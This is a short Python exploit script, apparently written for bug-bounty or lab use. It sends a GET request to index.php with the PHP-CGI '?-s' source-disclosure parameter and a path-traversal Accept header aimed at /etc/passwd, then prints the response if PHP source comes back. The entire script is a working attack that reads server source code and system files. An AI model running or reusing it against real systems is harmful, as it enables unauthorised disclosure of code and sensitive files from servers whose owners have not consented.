import requests

url = 'http://192.168.203.129/index.php?-s'
headers = {
                "User-Agent": "bugbounty",
                "Accept": "../../../../../../../../../../etc/passwd{{"
            }

req = requests.request('GET',url, headers=headers)

if '&lt;?php' in req.text:
    print(req.text)
else:
    print('no')